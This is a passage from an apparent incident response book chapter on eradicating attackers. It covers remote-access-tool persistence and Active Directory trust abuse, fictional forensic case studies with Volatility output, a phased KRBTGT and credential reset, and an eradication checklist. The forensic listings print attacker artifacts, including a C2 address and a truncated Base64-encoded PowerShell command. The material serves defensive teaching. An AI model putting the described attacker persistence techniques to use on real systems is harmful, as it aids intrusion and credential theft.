For example, the Akira ransomware group, a threat actor reportedly collecting over $42 million in

ransomware payments across 250 attacks, has been observed using AnyDesk as a primary remote access

tool during intrusions. [37]

[38]

Through AnyDesk, Akira operators can maintain persistent access to

compromised systems, facilitating remote desktop access (as shown in Figure 117 ), data exfiltration, and

ransomware deployment through file transfer capabilities (as shown in Figure 118).

Figure 117 | AnyDesk Remote Desktop Access

Figure 118 | AnyDesk File Transfer Access

Eradication challenges arise because these tools are designed to provide reliable remote access and include

features that make them resilient. Remote access tools often install as services with automatic restart

capabilities, making simple process termination ineffective. Some tools support unattended access

configurations that persist even when the visible application is closed or uninstalled.

Attackers can install these tools through multiple vectors, including compromised accounts, phishing, or the

exploitation of other vulnerabilities. Once installed, access is via the vendor’s cloud infrastructure rather

than attacker-controlled command-and-control servers. This indirection makes blocking more difficult

since it requires either removing the tool entirely or coordinating with the vendor to revoke access.

Mitigation approaches focus on inventorying and controlling remote access tools across the environment.

Maintain an authoritative list of approved remote access solutions and actively detect unauthorized

Eradicate Activity | Chapter 13 | 363

installations. Configure endpoint protection to alert on or block the installation of unapproved remote

access software. For authorized tools, implement centralized management that provides visibility into active

sessions and the ability to revoke access.

Cross-Trust Boundary Threat Investigation

Attackers who compromise a single domain or identity provider can leverage trust relationships to establish

persistence across connected environments. Forest trusts, external domain trusts, and federated identity

configurations extend authentication across organizational boundaries, creating pathways for attackers to

maintain access even after eradication efforts in the initially compromised environment.

Evidence analysis challenges arise because trust relationships enable attackers to gain access to

environments that may not have been directly compromised. An attacker who compromises a domain

controller in one forest can create accounts or modify permissions in a trusted forest. These artifacts

appear in the trusted forest’s logs as legitimate cross-forest authentication rather than lateral movement

from a compromised source. Analysts examining only the trusted forest may find valid accounts and

permissions with no local indicators of how they were created.

Consider an organization with a two-way forest trust between a corporate forest (corp.falsimentis.com) and

an acquisition’s forest (pseudovision.com). An attacker who gains Domain Admin access in

pseudovision.com can use the trust relationship to add a malicious account to privileged groups in

corp.falsimentis.com, as shown in Figure 119.

Figure 119 | Cross-Forest Attack Path Example

Federated identity systems present similar challenges.  Organizations using SAML or OIDC federation trust

external identity providers to authenticate users. An attacker who compromises the identity provider (IdP)

can issue tokens granting access to all relying party applications. Eradicating the attacker from individual

applications is ineffective if the compromised IdP continues issuing valid tokens.  Similarly, hybrid

environments synchronizing on-premises Active Directory with Entra ID can propagate compromised

accounts in either direction, requiring coordinated remediation across both environments.

Scoping eradication across trust boundaries requires enumerating all trust relationships from the

compromised environment. For Active Directory environments, identify forest trusts, external trusts, and

realm trusts that could provide pathways to other domains using the PowerShell Active Directory module

and the Get-ADTrust command as shown in Listing 106 . For federated identity, identify all relying party

applications that accept tokens from the compromised identity provider. Review authentication logs in

trusted environments for activity originating from the compromised source during the incident timeframe.

Listing 106 | Active Directory Trust Enumeration

PS C:\> Get-ADTrust -Filter *

Name             Source                 Target                Direction       TrustType

----             ------                 ------                ---------       ---------

pseudovision.com corp.falsimentis.com   pseudovision.com      Bidirectional   Forest

genusight.com    corp.falsimentis.com   genusight.com         Outbound        External

Artifact removal requires coordinated action across trust boundaries. Disabling a compromised account in

one domain does not remove group memberships or permissions that the account created in trusted

domains. Revoking tokens in one identity provider does not invalidate sessions in federated applications

that cache authentication state. Eradication plans should include explicit steps for each trusted

environment, with verification that cross-boundary artifacts have been removed.

Sequencing eradication across trust boundaries depends on the direction of trust and the attacker’s access.

If an attacker compromises the trusted source (the IdP or the forest that others trust), remediate that

environment first to prevent continued propagation. If the attacker used trust relationships to pivot into

other environments, those downstream environments may require independent eradication efforts

coordinated with the source environment’s remediation.

ERADICATE ACTIVITY EXAMPLES

The following examples illustrate the importance of eradication in the incident response process.

The Memory Forensics Discovery

When the security team at Greystone Manufacturing contained a workstation belonging to a senior

engineer, the initial assessment suggested a straightforward malware infection. Endpoint protection had

flagged a suspicious process, and network monitoring showed connections to a known command-and-

control server at 123.188.115.243.

Maya Rodriguez, the incident response analyst assigned to the case, was concerned there was more to the

story. The engineer had access to industrial control system designs and supplier pricing data, making this

workstation a high-value target.

Maya started investigating a whole-system memory capture from the compromised workstation using a

memory forensics framework such as Volatility. Her first step was to enumerate running processes to

identify anomalies beyond those flagged by endpoint protection.

Eradicate Activity | Chapter 13 | 365

Listing 107 | Process Listing with Volatility

$ vol -qf greystone_eng_caseir0523.raw windows.pslist.PsList

Volatility 3 Framework 2.26.2

PID     PPID    ImageFileName   Offset(V)       Threads Handles SessionId

4       0       System          0xbf84ba8b4040  167     -       N/A

[...]

6824    856     svchost.exe     0xbf84c1234560  8       -       0

7012    856     svchost.exe     0xbf84c2345670  6       -       0

7156    7012    rundll32.exe    0xbf84c3456780  3       -       0 1

8234    1       smss.exe        0xbf84c4567890  0       -       0 2

[...]

1 rundll32.exe spawned by svchost.exe (unusual parent process relationship).

2 smss.exe with parent process ID of 1 instead of 4 (System) indicates possible process manipulation.

The process listing revealed two anomalies that endpoint protection had not flagged. First, a rundll32.exe

process had been spawned by svchost.exe, an unusual parent-child relationship that suggested process

injection or DLL side-loading. Second, the smss.exe process showed a parent process ID of 1 rather than the

expected System process (PID 4), suggesting further system manipulation.

Maya continued investigating the suspicious rundll32.exe process using a code-injection detection plugin

such as Volatility’s malfind to identify any injected code in process memory, as shown in Listing 108.

Listing 108 | Detecting Injected Code with Malfind

$ vol -qf greystone_eng_caseir0523.raw windows.malfind.Malfind --pid 7156

Volatility 3 Framework 2.26.2

PID     Process         Start VPN       End VPN         Tag     Protection      CommitCharge

PrivateMemory   File

7156    rundll32.exe    0x1d0000        0x1d2fff        VadS    PAGE_EXECUTE_READWRITE  3

1       Disabled

0x1d0000        4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00     MZ.............. 1

[...]

1 MZ header indicating a PE file injected into process memory.

The Malfind plugin output revealed that an executable file (indicated by the MZ header) had been injected

into the rundll32.exe process’s memory space.  Maya extracted the injected code for further analysis using

the Volatility memdump plugin, then used the netscan plugin to examine network connections, as shown in

Listing 109.

Listing 109 | Network Connection Analysis

$ vol -qf greystone_eng_caseir0523.raw windows.netscan.NetScan

Volatility 3 Framework 2.26.2

Offset          Proto   LocalAddr    LocalPort  ForeignAddr      ForeignPort  State        PID

Owner

0xbf84c8901234  TCPv4   10.50.23.42  49234      123.188.115.243  443          ESTABLISHED  7156

rundll32.exe 1

0xbf84c8902345  TCPv4   10.50.23.42  49567      10.50.20.15      445          ESTABLISHED  8234

smss.exe     2

0xbf84c8903456  TCPv4   10.50.23.42  49892      10.50.20.18      3389         ESTABLISHED  8234

smss.exe     3

[...]

1 C2 connection from injected rundll32.exe to external IP.

2 SMB connection to internal file server from fake smss.exe

3 RDP connection to the engineering server from fake smss.exe

The network analysis revealed that the threat was far more serious than the initial assessment suggested.

The injected rundll32.exe maintained the C2 connection that endpoint protection had detected.  The fake

smss.exe process, however, had established connections to two internal systems: a file server (10.50.20.15)

and an engineering server (10.50.20.18). This indicated lateral movement that the initial investigation had

missed.

Maya used Volatility to examine the command-line arguments for the suspicious processes, which can offer

insights into how they were used, as shown in Listing 110.

Listing 110 | Command Line Analysis

$ vol -qf greystone_eng_caseir0523.raw windows.cmdline.CmdLine --pid 7156,8234

Volatility 3 Framework 2.26.2

PID     Process         Args

7156    rundll32.exe    C:\Windows\System32\rundll32.exe

C:\Users\bthompson\AppData\Local\Temp\update.dll,DllMain

8234    smss.exe        C:\Windows\Fonts\smss.exe -enc

aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA... 1

1 Base64-encoded PowerShell command executed by fake smss.exe

The command-line analysis revealed that the fake smss.exe was actually executing an encoded PowerShell

script. Maya decoded the Base64 string and discovered a second-stage loader that established persistence

and facilitated lateral movement.

To understand the full scope of attacker activity, Maya examined the handles held by the malicious

processes to identify files and registry keys they had accessed, as shown in Listing 111.

Listing 111 | Handle Analysis for Malicious Process

$ vol -qf greystone_eng_caseir0523.raw windows.handles.Handles --pid 8234

Volatility 3 Framework 2.26.2

PID   Process   Offset          HandleValue  Type  GrantedAccess  Name

8234  smss.exe  0xbf84d1234560  0x4          Key   0x20019

\REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

8234  smss.exe  0xbf84d2345670  0x1c         File  0x100081

Eradicate Activity | Chapter 13 | 367

\Device\HarddiskVolume3\Users\bthompson\Documents\ICS_Designs 1

8234  smss.exe  0xbf84d3456780  0x24         File  0x100081

\Device\HarddiskVolume3\Users\bthompson\Documents\Supplier_Pricing

[...]

1 File handles confirming access to sensitive engineering documents.

The handle analysis confirmed Maya’s initial concerns about targeting this engineer’s workstation. The

attacker specifically accessed directories containing industrial control system designs and supplier pricing

information, significantly expanding the incident’s scope.

Maya documented her memory forensics findings and their implications for eradication:

• Processes requiring removal: Injected rundll32.exe (PID 7156), fake smss.exe (PID 8234 located in

C:\Windows\Fonts\).

• Persistence mechanism: Registry Run key modification requiring removal.

• Malicious files: C:\Users\bthompson\AppData\Local\Temp\update.dll, C:\Windows\Fonts\smss.exe

• Lateral movement targets: File server 10.50.20.15, engineering server 10.50.20.18 require additional

scoping and investigation.

• Data exposure: ICS_Designs and Supplier_Pricing directories accessed; determine if attacker exfiltrated

data from these locations.

The memory forensics investigation transformed what appeared to be a routine malware cleanup into a

multi-system incident requiring coordinated eradication. Without the memory analysis, the response team

would have removed the detected malware and declared the incident resolved. They would have been

unaware that the attacker had already moved laterally to additional systems and accessed sensitive

intellectual property.

Maya’s findings triggered a broader investigation effort into the incident, with scoping activities extending

to the file server and engineering server identified in the network connections.

The Coordinated Credential Reset

David Barrett, a senior security analyst at Northwind Financial Services, faced a complex eradication task.

The investigation confirmed that attackers gained domain admin access via a compromised service account

and had been in the environment for at least three weeks.  Memory forensics revealed the execution of a

credential-harvesting tool (Mimikatz) on two domain controllers, suggesting the attackers had harvested

credentials. The incident manager determined that a comprehensive credential reset was necessary to

eliminate attacker access.

David began by mapping the credential reset scope using Microsoft’s tier model as a framework.  He

identified twelve Tier 0 accounts (domain admins, enterprise admins, and accounts with DC logon rights),

forty-seven Tier 1 accounts (server administrators, database admins, and privileged service accounts), and

over 200 Tier 2 accounts (workstation admins and help desk staff with elevated privileges). The environment

also had eighty-three service accounts running critical applications, each requiring coordination with

application owners before reset.

Before executing any resets, David confirmed that the administrative workstations and jump hosts used to

perform the resets were themselves verified as clean. A credential reset performed from a compromised

workstation simply hands the new credentials to the attacker, so the systems used to drive the reset are as

important to verify as the accounts being reset.

Figure 120 | Northwind Financial Account Tiers

David documented the dependencies that would affect the sequencing of account resets. The trading

platform relied on a service account svc_tradingdb that authenticated to Microsoft SQL Server clusters. The

backup system used svc_backup with credentials stored in the backup software’s configuration. Several

legacy applications used service accounts with passwords that had not been rotated in years. The

application administration teams for these systems were not certain they could update the credentials

without extended outages.

David presented the credential reset plan to the incident manager, proposing a phased approach over a

seventy-two-hour window, as shown in Table 31.

Table 31 | Credential Reset Phases

PHASE SCOPE TIMING

Phase 1 KRBTGT account (twice), Tier 0 accounts Friday 11 PM - Saturday 3 AM

Phase 2 Tier 1 accounts, critical service accounts Saturday 6 AM - 12 PM (reduced

trading hours)

Phase 3 Tier 2 accounts, remaining service accounts Saturday 2 PM - Sunday 6 PM

Phase 1 began on Friday at 11 PM during a scheduled maintenance window. David started with the KRBTGT

account, executing the first reset and waiting for replication to complete across all domain controllers, as

shown in Listing 112.

Listing 112 | KRBTGT Reset - Phase 1

PS C:\> Set-ADAccountPassword -Identity krbtgt -Reset -NewPassword (ConvertTo-SecureString

-AsPlainText "K3rb3r0s#R3s3t#Ph4s31!" -Force)

PS C:\>

After confirming replication, David waited ten hours before executing the second KRBTGT reset Saturday

morning. This delay ensured that any golden tickets created by the attacker would exceed the maximum

ticket lifetime and become invalid after the second reset.

With the KRBTGT reset complete, David moved to Tier 0 accounts. He had coordinated with each domain

admin in advance, scheduling their resets during the maintenance window when they wouldn’t need access.

Eradicate Activity | Chapter 13 | 369

For the two domain admin accounts that belonged to on-call staff, he created temporary accounts with

limited validity periods to maintain emergency access capability during the reset window.

Phase 2 required careful coordination with application teams. David had prepared a spreadsheet tracking

each service account, its dependent applications, the application owner’s contact information, and the

agreed-upon reset procedure outlined in Figure 121. For the trading platform’s database service account, the

application team had tested the credential update procedure in their staging environment earlier that week.

Figure 121 | Service Account Reset Coordination

The backup service account presented an unexpected challenge. When the backup team attempted to

update the credentials in their software, they discovered the configuration was encrypted with the old

service account password. David worked with the backup vendor’s support team to export the

configuration, update the credentials, and re-import the settings, extending Phase 2 by two hours.

Phase 3 proceeded more smoothly, with Tier 2 accounts reset in batches organized by department. David

used PowerShell to generate temporary passwords and trigger password change requirements at next

logon, as shown in Listing 113.

Listing 113 | Tier 2 Batch Password Reset

PS C:\> $tier2Users = Get-ADUser -Filter * -SearchBase "OU=Tier2Admins,DC=northwind,DC=local"

PS C:\> foreach ($user in $tier2Users) {

>>     $tempPassword = ConvertTo-SecureString -AsPlainText ( -join (1..16 | ForEach-Object {

[char](Get-Random -Minimum 33 -Maximum 127) }) ) -Force

>>     Set-ADAccountPassword -Identity $user -Reset -NewPassword $tempPassword

>>     Set-ADUser -Identity $user -ChangePasswordAtLogon $true

>>     Write-Host "Reset password for $($user.SamAccountName)"

>> }

Reset password for jsmith_admin

Reset password for mwilliams_admin

Reset password for kjohnson_admin

[...]

Throughout the reset process, David monitored for signs of attacker activity.  He configured alerts for

authentication failures from the known attacker IP ranges, new account creations, and any attempts to use

the old KRBTGT hash. The security team maintained continuous monitoring of domain controller event logs,

watching for Event ID 4768 (Kerberos TGT requests) that would indicate the attacker attempting to use

previously harvested credentials.

After completing all three phases, David executed validation checks to confirm the reset effectiveness, as

shown in Listing 114.

Listing 114 | Credential Reset Validation

PS C:\> Get-ADUser krbtgt -Properties PasswordLastSet | Select-Object PasswordLastSet

PasswordLastSet

---------------

11/16/2025 9:15:22 AM 1

PS C:\> Get-ADUser -Filter * -SearchBase "OU=Tier0,DC=northwind,DC=local" -Properties

PasswordLastSet |

>>     Where-Object -Property PasswordLastSet -LT (Get-Date).AddDays(-1) |

>>     Select-Object SamAccountName, PasswordLastSet 2

PS C:\> 3

1 Verify the KRBTGT password last set time matches the documentation for the 2nd password reset.

2 Verify no Tier 0 accounts have passwords older than the reset window.

3 No results returned - all Tier 0 passwords reset within the last twenty-four hours.

David documented the credential reset in the incident record:

• KRBTGT resets: Two resets completed ten hours apart, replication verified after each.

• Tier 0 accounts: 12 accounts reset, 2 temporary accounts created and subsequently disabled.

• Tier 1 accounts: 47 accounts reset, all service account dependencies documented and updated.

• Tier 2 accounts: 214 accounts reset with forced password change at next logon

• Service accounts: 83 accounts reset, backup system required vendor coordination for configuration

update.

Eradicate Activity | Chapter 13 | 371

• Issues encountered: Backup software configuration encryption required a two-hour extension to Phase

2.

• Monitoring results: No authentication attempts using old credentials were detected during or after the

reset window.

The coordinated credential reset eliminated the attacker’s ability to use harvested credentials while

maintaining critical business operations. The phased approach allowed the trading platform to continue

operating during reduced-activity periods, and the advanced coordination with application teams

prevented service disruptions from catching anyone off guard.

ERADICATE: STEP-BY-STEP

The following steps provide a condensed reference for eradication activities. Each step corresponds to

topics covered earlier in this chapter, organized for use when investigating the presence of attackers,

removing persistence mechanisms, and remediating the conditions that enabled the attack.

This step-by-step guide is available for download in PDF and Markdown formats on the

companion website at dynamicincidentresponse.com.

Step 1. Conduct Short-Form Investigation to Inform Eradication

Short-form investigation provides the insight needed to proceed with eradication without waiting for the

full forensic picture. A parallel long-form investigation may continue throughout eradication and into

recovery to support regulatory reporting, legal proceedings, and organizational learning; the eradicate

chapter’s "Long-Form Investigation for Comprehensive Understanding" section describes the parallel track

in detail.

1. Answer important eradication questions through evidence analysis, including:

◦ What was the initial access vector? Has it been closed?

◦ What credentials were compromised? Have they been rotated?

◦ What other systems did the attacker access? Are they also targeted for eradication?

◦ What persistence mechanisms did the attacker deploy? Are they all identified?

◦ What vulnerability enabled the attack? Has it been patched?

2. Apply log investigation techniques, including:

◦ Use a portable detection-rule format with a fast event-log scanner for rapid Windows Event Log

analysis.

◦ Query SIEM platforms for indicators of compromise across all ingested log sources.

◦ Correlate authentication logs, application logs, and network flow data.

◦ Add eradication-sequencing markers to the attack timeline produced during scope, identifying

when each persistence mechanism was deployed so removal can proceed in safe order. Building the

canonical attack-progression timeline is a scope activity; eradicate annotates it.

3. Conduct live investigation on contained systems, including:

◦ Enumerate running processes, network connections, and system configuration.

◦ Apply differential analysis comparing the current state against known-good baselines to identify

new services, scheduled tasks, and accounts.

◦ Document findings systematically for eradication planning.

4. Perform a memory investigation when deeper analysis is required, including:

◦ Analyze the memory captured during contain using a memory forensics framework to examine

processes, network connections, and loaded drivers. Volatile data collection is itself a contain

activity. If memory was not captured during contain, capture it now with a whole-system memory

acquisition tool before proceeding with analysis.

◦ Identify injected code using process-memory analysis techniques.

◦ Extract command-line arguments and handles to understand attacker objectives.

5. Analyze network data to map attacker communications, including:

◦ Review packet captures, NetFlow data, and firewall logs for lateral movement patterns.

◦ Examine DNS logs for command-and-control domain lookups.

◦ Visualize cloud network connection graphs from flow log data.

◦ Identify data exfiltration indicators through volume analysis and destination review.

6. Use EDR platforms for centralized endpoint investigation, including:

◦ Query EDR consoles to scope attacker activity across multiple endpoints.

◦ Correlate EDR alerts with findings from log, memory, and network investigation.

7. Conduct malware investigation when malicious files are identified, including:

◦ Perform static analysis: file hashing, string extraction, PE structure analysis, and cross-referencing

with threat intelligence platforms.

◦ Perform dynamic analysis in isolated environments: execute malware with system-monitoring tools

and review sandbox reports from automated analysis platforms.

◦ Identify artifacts created by the malware (files, registry keys, processes) and persistence

mechanisms requiring removal.

◦ Extract network IOCs (C2 domains, IP addresses) for containment and continued scoping.

8. Investigate Business Email Compromise (BEC) when email-based attacks are suspected, including:

◦ Enumerate mailbox rules and forwarding configurations on affected accounts.

◦ Review organization-level mail flow and transport rules for unauthorized changes.

◦ Enumerate OAuth application permissions and third-party integrations.

◦ Analyze sign-in logs for impossible travel patterns and suspicious authentication activity.

◦ Coordinate with finance and accounting teams to trace fraudulent transactions during the

compromise window.

9. Investigate insider threats when authorized users are involved, including:

◦ Coordinate closely with HR, legal, and company leadership before beginning the investigation.

◦ Focus on data access patterns, privilege changes, and exfiltration methods.

◦ Look for remote access tools, secondary accounts, or modified system configurations that could

allow continued access.

◦ Document findings meticulously for potential legal proceedings.

10. Investigate supply chain compromises when trusted channels are involved, including:

◦ For software supply chain incidents, identify all systems with the compromised software version and

review vendor IOCs.

◦ For hardware supply chain incidents, document serial numbers, procurement sources, and shipping

chains.

◦ For service provider compromises, identify all access points the compromised partner has to the

environment and review authentication logs for unusual activity.

◦ Coordinate with the compromised supplier or partner to share investigation findings.

11. Investigate cloud environments for IaaS and SaaS compromises, including:

◦ Review cloud audit logs for unauthorized API calls and IAM modifications.

Eradicate Activity | Chapter 13 | 373

◦ Apply differential analysis comparing the deployed state against IaC definitions or documented

baselines.

◦ Investigate IAM roles, assume-role trust relationships, and cross-account access for unauthorized

changes.

◦ Review storage access logs, serverless function deployments, and container image modifications.

◦ For SaaS compromises, request activity reports from the provider and review integration logs from

connected on-premises systems.

◦ Enumerate privileges and OAuth applications within SaaS environments for persistence

mechanisms.

Step 2. Perform Root Cause Analysis

1. Identify the root cause of the incident, including:

◦ Trace the attack chain back to the initial compromise point.

◦ Distinguish between immediate causes and underlying root causes.

◦ Document the sequence of events that enabled the attacker’s access.

◦ Identify systemic weaknesses that allowed the attack to succeed.

2. Use structured analysis techniques, including:

◦ Apply fishbone diagram mapping to categorize contributing factors across the four P’s: People,

Process, Product, and Policy.

◦ Alternatively, use the Five Whys technique for focused, linear root cause analysis.

◦ Engage relevant stakeholders from IT, security, and business units.

◦ Validate findings against collected evidence.

3. Document root cause findings for remediation planning, including:

◦ Record specific vulnerabilities, misconfigurations, or process failures.

◦ Identify preventive measures to address each contributing factor.

◦ Prioritize remediation based on risk and feasibility.

◦ Feed findings into both immediate eradication and long-term security improvements.

Step 3. Remove Persistence Mechanisms

1. Address Windows persistence mechanisms, including:

◦ Use a consolidated autostart enumeration tool to list persistence locations in a single view and

compare against known-good baselines.

◦ Examine registry Run keys (HKLM and HKCU \Software\Microsoft\Windows\CurrentVersion\Run).

◦ Review scheduled tasks for unauthorized entries.

◦ Check services for unauthorized entries.

◦ Examine startup folders, WMI event subscriptions, and DLL search order hijacking.

◦ Review the Group Policy for malicious scripts or software deployment.

2. Address Linux persistence mechanisms, including:

◦ Review cron jobs in /etc/crontab, /etc/cron.d/, and user crontabs, and review pending at jobs.

◦ Examine systemd services in /etc/systemd/system/ and user service directories.

◦ Check shell initialization files (.bashrc, .profile, /etc/profile.d/).

◦ Review authorized_keys files for unauthorized SSH access.

◦ Examine kernel module and library preloading configurations (/etc/ld.so.preload and LD_PRELOAD).

◦ Review PAM modules in /etc/pam.d/ for backdoors.

◦ Check for unauthorized SUID/SGID binaries and sudo configuration changes.

◦ Review package manager hooks, git hooks, and udev rules for malicious entries.

3. Remove service and application persistence mechanisms, including:

◦ Search for files with suspicious characteristics (encoded content, eval functions).

◦ Compare web directories against known-good baselines.

◦ Review web server logs for access patterns to suspicious files.

◦ Verify file integrity against deployment manifests or version control.

4. Address cloud persistence mechanisms, including:

◦ Review IAM users, roles, and policies for unauthorized access grants.

◦ Examine serverless functions, container images, and event triggers.

◦ Check for unauthorized API keys, access tokens, and service account credentials.

◦ Review resource policies, bucket policies, and cross-account access configurations.

◦ Audit OAuth application registrations and consent grants.

Step 4. Remediate Accounts and Identity Systems

This step addresses the identity system as a whole, including the blast-radius accounts revealed during

scope and the deeper identity primitives (KRBTGT, trust passwords, delegation, hybrid AD/Entra) that are

out of scope for contain. The known-compromised set is already invalidated during contain; Step 4 picks up

from there and works outward.

1. Remediate local accounts and credentials across the expanded scope identified after contain, including:

◦ Remove unauthorized local accounts from affected systems.

◦ Reset passwords for additional legitimate accounts revealed during scope as having been touched,

beyond the known-compromised set already reset during contain.

◦ Clear cached credentials from LSASS, browser stores, and credential managers.

◦ Rotate local administrator passwords using a managed local-administrator password solution.

2. Remediate Active Directory accounts and credentials, expanding remediation across the AD

environment, including:

◦ Follow Microsoft’s tier model (Tier 0, Tier 1, Tier 2) for prioritization.

◦ Reset passwords for compromised accounts, starting with those with the highest privilege, including

accounts revealed during scope that contain did not address.

◦ Review and remove unauthorized group memberships.

◦ Audit and reset service account credentials with application team coordination.

3. Reset the KRBTGT account when a Kerberos compromise is suspected:

◦ Perform the KRBTGT password reset twice, with ten-plus-hour delay between resets.

◦ Verify replication completion across all domain controllers after each reset.

◦ In multi-domain forests, reset the KRBTGT in the child domains before resetting it in the parent

domains.

◦ Monitor for authentication failures indicating active Golden Ticket usage.

◦ Document reset timing for compliance and incident records.

4. Reset domain controller machine account passwords:

◦ Reset each domain controller’s machine account password individually after completing KRBTGT

resets.

◦ Allow replication to complete between machine account resets.

5. Reset trust passwords when inter-domain or inter-forest trusts are involved:

Eradicate Activity | Chapter 13 | 375

◦ Reset trust passwords on the trusting side of each affected trust relationship.

◦ Verify trust functionality after reset.

6. Disable unconstrained delegation where not strictly required, including:

◦ Identify computer and user objects with unconstrained delegation using directory-query tooling

appropriate to the environment.

◦ Disable unconstrained delegation on objects that do not require it.

◦ Migrate to constrained or resource-based constrained delegation where delegation is needed.

7. Address hybrid and cloud identity systems, including:

◦ Coordinate remediation across on-premises AD and Entra ID.

◦ Revoke all refresh tokens and active sessions for compromised users in the cloud IdP.

◦ Reset passwords in both environments, accounting for synchronization delays.

◦ Review and remove malicious Entra ID application registrations.

◦ Verify that the Entra Connect synchronization rules have not been modified and reset the

synchronization service account credentials.

◦ Audit federated identity provider configurations for unauthorized changes.

8. Extend session and token revocation to the expanded account set (contain Step 2 already revoked

sessions and tokens for the known-compromised set), including:

◦ Force termination of active sessions through the identity provider for additional accounts identified

during scope.

◦ Revoke OAuth refresh and access tokens, personal access tokens, and API keys for the expanded

account set.

◦ Rotate service credentials and API keys for service accounts revealed during scope, and update

dependent applications.

◦ Clear browser-stored credentials, authentication cookies, and session tokens on systems newly

identified as touched by the attacker.

◦ Monitor for token reuse attempts across both the contain-era and eradicate-era revocation sets.

Step 5. Execute Targeted Removal or Rebuild

1. Choose an appropriate eradication strategy:

◦ Targeted removal: Remove specific malware and persistence when the scope is well-understood.

◦ Full rebuild: Reinstall from clean media when the compromise scope is uncertain.

◦ Restore from backup: Use verified, clean backups when available and validated.

2. Validate the eradication method, including:

◦ Confirm a clean backup exists for the backup-restore path (the per-system backup integrity

validation at restore time is a recover Step 1 activity).

◦ Ensure root cause is addressed before rebuilding or restoring systems to prevent reinfection.

◦ Test rebuilt systems in an isolated environment before handing them to recover for production

validation testing.

◦ Document the eradication method and validation steps for each system.

Step 6. Remediate Vulnerabilities

1. Identify and patch exploited vulnerabilities, including:

◦ Map exploited vulnerabilities to CVE identifiers where applicable.

◦ Cross-reference with the CISA Known Exploited Vulnerabilities catalog.

◦ Prioritize patches for vulnerabilities actively exploited in the incident.
